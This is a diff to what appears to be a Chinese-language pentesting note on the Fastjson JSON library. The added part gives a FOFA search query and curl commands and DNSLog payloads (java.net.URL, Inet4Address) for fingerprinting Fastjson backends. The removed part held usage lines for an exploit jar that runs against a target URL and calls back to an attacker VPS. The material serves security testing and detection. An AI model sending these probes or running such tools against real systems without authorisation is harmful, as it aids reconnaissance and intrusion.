@@ -1,25 +1,60 @@
 ## 应用简介
 
-Fastjson是阿里巴巴公司开源的一款json解析器，其性能优越，被广泛应用于各大厂商的Java项目中
+Fastjson是阿里巴巴公司开源的一款JSON解析库，可用于将Java对象转换为其JSON表示形式，也可以用于将JSON字符串转换为等效的Java对象。
 
-Fastjson在解析json的过程中，支持使用autoType来实例化某一个具体的类，并调用该类的set/get方法来访问属性。通过查找代码中相关的方法，即可构造出一些恶意利用链
+它采用一种“假定有序快速匹配”的算法，把JSON Parse的性能提升到极致，是目前Java语言中最快的JSON库。Fastjson接口简单易用，已经被广泛使用在缓存序列化、协议交互、Web输出、Android客户端等多种应用场景。
 
-Fastjson于1.2.24版本后增加了反序列化白名单，而在1.2.48以前的版本中，攻击者可以利用特殊构造的json字符串绕过白名单检测，成功执行任意命令
+## 相关资产
 
-[Fastjson反序列化漏洞的检测和利用](https://mp.weixin.qq.com/s?__biz=MzIyNzY1MzUxMQ==&mid=100000244&idx=1&sn=801c947da8f74a4bda5039994951f040&chksm=685ca31c5f2b2a0a414e2848cc7f6e5a6778bbd309fc8d46bb4f4c7769d9f43ae06e0bae4959#rd)
+FOFA
 
-**Fastjson 反序列化漏洞快速检测和利用工具**
-
-https://github.com/21superman/fastjson_exploit
-
-```bash
-检测： java -jar fastjson_exploit-1.0-SNAPSHOT-all.jar -u 目标url
-
-利用： java -jar fastjson_exploit-1.0-SNAPSHOT-all.jar -e -u 目标url
-
-vps环境: java -jar fastjson_exploit-1.0-SNAPSHOT-all.jar -e -H vps公网ip -u 目标url
+```http
+app="Fastjson"
 ```
 
-一个简单的Fastjson反序列化检测burp插件
+## 识别方法
 
-？？自己的工具包里有
+如果站点有原始报错回显，可以用不闭合花括号的方式进行报错回显
+
+```bash
+curl http://192.168.2.133:32768/ -H "Content-Type: application/json" --data '{{"@type":"java.net.URL","val":"mx2guq.dnslog.cn"}:0'
+```
+
+```bash
+#payload
+{"a":"
+{{"@type":"java.net.URL","val":"dnslog"}:0
+```
+
+```
+#匹配特征
+http.code=500 && "Internal Server Error" in body
+```
+
+还可以通过DNS回显的方式检测后端是否使用Fastjson
+
+```bash
+curl http://x.x.x.x:8090/ -H "Content-Type: application/json" --data '{{"@type":"java.net.URL","val":"dnslog"}:0'
+```
+
+1.2.67版本前
+
+```
+{"zeo":{"@type":"java.net.Inet4Address","val":"dnslog"}}
+```
+
+1.2.67版本后payload
+
+```
+{"@type":"java.net.Inet4Address","val":"dnslog"}
+```
+
+## 环境搭建
+
+https://www.runoob.com/w3cnote/fastjson-intro.html
+
+https://www.cnblogs.com/hei-zi/p/13274272.html
+
+## 不出网利用
+
+[@flashine {fastjson 不出网利用总结}](https://mp.weixin.qq.com/s/LZt-I3s0dQ_bK9ubEix8iQ)
